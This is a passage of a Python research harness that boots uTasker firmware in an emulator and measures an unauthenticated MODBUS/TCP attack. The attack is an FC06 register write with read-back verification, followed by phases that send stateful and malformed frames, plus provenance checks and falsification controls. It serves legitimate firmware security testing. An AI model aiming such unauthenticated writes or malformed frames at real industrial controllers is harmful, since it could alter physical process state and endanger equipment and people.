                                stdin=subprocess.DEVNULL, stdout=logf,
                                stderr=subprocess.STDOUT, preexec_fn=os.setsid)

        atk = _wait_for_session(proc, sport)
        if atk is None:
            stage("error",
                  note="firmware never answered its MODBUS/TCP listener (see %s)"
                       % log_path)
            return _extend_milestone(result)
        result["booted"] = True
        # M2/M3: the firmware's own uNetwork stack answered ARP and completed a
        # TCP handshake on port 502, which needs its drivers up and its task
        # scheduler turning over -- not merely "it did not fault".
        result["milestone"] = "M3"
        stage("connect",
              note="MODBUS/TCP session up to %s:%d -- no credentials were offered "
                   "or requested" % (modbus.FW_IP, modbus.MODBUS_PORT))

        # Baseline: the slave's live register map as it serves it right now. Read
        # in one burst (the firmware's session does not survive idle gaps).
        before_map = atk.read_map()
        stage("read", result=before_map,
              note="holding registers %s = %s" % (list(VALID_REGISTERS),
                                                  list(before_map.values())))

        # The attack + oracle (UNCHANGED): FC06 write, then read-back through the
        # firmware's own MODBUS engine; landed iff the high byte survived.
        res = atk.arm(reg, value)
        result["attack"] = res
        # GATE the verdict on provenance (playbook: "a control that cannot fail
        # the verdict is not a control"). `landed` is the firmware's own
        # read-back AND the proof that the guest which produced it is the child
        # this process spawned, on this run's private spool.
        prov = _verify_child(proc, log_path, spool)
        result["provenance"] = prov
        # THE SEAM (M4).  An FC06 request goes in over MODBUS/TCP and the
        # firmware's OWN MODBUS engine answers it, then answers an independent
        # FC03 read-back carrying the attacker's value.  Inbound protocol
        # request -> outbound firmware-composed reply.
        result["modbus_round_trip"] = bool(res.get("landed"))
        result["landed"] = bool(result["modbus_round_trip"]) and bool(prov.get("ok"))
        if result["landed"]:
            result["milestone"] = "M4"
        if res.get("landed") and not prov.get("ok"):
            stage("provenance", result=prov,
                  note="REFUSED: the MODBUS answers did not come from the "
                       "emulator this attack spawned")
        stage("attack", result=res,
              note="FC06 wrote 0x%04x to register %d -> read-back %s; landed=%s"
                   % (value, reg, res.get("after_hex"), res.get("landed")))

        # Best-effort restore (low bits are live, so this is not guaranteed exact).
        rest = atk.restore(reg, before_map.get(reg))
        result["restore"] = rest
        stage("restore", result=rest, note="wrote the previous value back")

        # ---- M6 and M7, on the SAME boot and the SAME session --------------
        # Both are skipped whenever the seam control is armed, and the run says
        # so: HAL_SEAM_CONTROL=1's whole claim is that no MODBUS PDU was ever
        # sent, and both phases send plenty (playbook w33.2).
        if not ladder:
            result["ladder_skipped_reason"] = "ladder=False"
        elif SEAM_CONTROL:
            result["ladder_skipped_reason"] = (
                "HAL_SEAM_CONTROL=1 -- the M6/M7 phases transmit MODBUS PDUs, "
                "which would contradict this control's claim that none were "
                "sent (playbook w33.2)")
        else:
            try:
                result["loadavg"] = os.getloadavg()
            except OSError:
                result["loadavg"] = None
            try:
                rng = random.Random()
                image = paths.firmware_bin().read_bytes()
                m6 = run_m6(atk.session, image, rng, stage, freeze=m6_freeze)
                result["m6"] = m6
                result["m6_stateful"] = m6["ok"]
                result["m6_freeze"] = m6_freeze
                stage("m6", note="%d/%d rounds, freeze=%s -> %s"
                                 % (m6["passed"], m6["rounds"], m6_freeze,
                                    m6["ok"]))
                m7 = run_m7(atk.session, stage, rng, wellformed=m7_wellformed)
                result["m7"] = m7
                result["m7_adversarial_tolerated"] = m7["ok"]
                result["m7_wellformed"] = m7_wellformed
                stage("m7", note="%d/%d classes (%d distinct exception codes, "
                                 "%d spec-predicted), known-good after=%s, "
                                 "twin arm=%s -> %s"
                                 % (m7["passed"], m7["classes"],
                                    m7["distinct_codes"],
                                    m7["spec_predicted_classes"],
                                    m7["known_good_after"], m7_wellformed,
                                    m7["ok"]))
            except Exception as exc:                        # noqa: BLE001
                # A defect in THIS code is a harness fault, not a device
                # result, and must print no rung (playbook w29.2/w37.3).
                result["harness_fault"] = "%s: %s" % (type(exc).__name__, exc)
                stage("harness_fault", note=result["harness_fault"])
        return _extend_milestone(result)
    finally:
        _shutdown(proc, logf)
        shutil.rmtree(spool, ignore_errors=True)   # our own private spool only
        stage("shutdown", note="rehost stopped")


def main(argv: Optional[List[str]] = None) -> int:
    import argparse
    p = argparse.ArgumentParser(
        prog="rehostry-utasker-modbus-attack",
        description="Unauthenticated MODBUS/TCP write against the uTasker "
                    "slave, plus the M6 and M7 phases on the same boot.")
    # The M6/M7 phases run on the DEFAULT path, deliberately: a rung is a
    # property of a RUN, so the census header must name the invocation a
    # verifier would type (playbook w35). --no-ladder restores the M4-only run.
    p.add_argument("--no-ladder", dest="ladder", action="store_false",
                   help="skip the M6 and M7 phases; grade M1..M4 only")
    p.add_argument("--m6-freeze", action="store_true",
                   help="M6's falsification knob: send the state-changing FC06 "
                        "with MBAP protocol id 0x0001 instead of the mandatory "
                        "0x0000, so THE FIRMWARE'S OWN stack refuses it and the "
                        "state never moves. M6 goes 3/3 -> 0/3; M4 and M7 are "
                        "untouched.")
    p.add_argument("--m7-wellformed", action="store_true",
                   help="M7's falsification knob: send each class's WELL-FORMED "
                        "twin instead of the malformed frame, scored by the "
                        "SAME predicate. Every twin is answered normally, so "
                        "the phase goes 0/8 while M4 and M6 are untouched.")
    # Reject unknown argv rather than ignoring it: a main() that takes no argv
    # silently swallows a documented-looking flag (playbook §2.200).
    args = p.parse_args(argv)

    def show(name: str, **d: Any) -> None:
        note = d.pop("note", "")
        print("[stage] %s: %s" % (name, note))
        for key, val in d.items():
            print("         %s=%s" % (key, val))

    res = run_attack(on_stage=show, ladder=args.ladder,
                     m6_freeze=args.m6_freeze,
                     m7_wellformed=args.m7_wellformed)
    summary = {k: v for k, v in res.items()
               if k in ("booted", "landed", "milestone", "modbus_round_trip",
                        "seam_control", "harness_fault", "m6_stateful",
                        "m7_adversarial_tolerated", "m6_freeze",
                        "m7_wellformed", "ladder_skipped_reason",
                        "m5_m8_status")}
    if isinstance(res.get("m6"), dict):
        summary["m6_passed"] = "%d/%d" % (res["m6"]["passed"], res["m6"]["rounds"])
    if isinstance(res.get("m7"), dict):
        summary["m7_passed"] = "%d/%d" % (res["m7"]["passed"], res["m7"]["classes"])
        summary["m7_known_good_after"] = res["m7"]["known_good_after"]
        summary["m7_broadcast_discriminator"] = res["m7"]["broadcast_discriminator"]
    print("RESULT:", json.dumps(summary))
    return 0 if res.get("landed") else 1


if __name__ == "__main__":
    raise SystemExit(main())
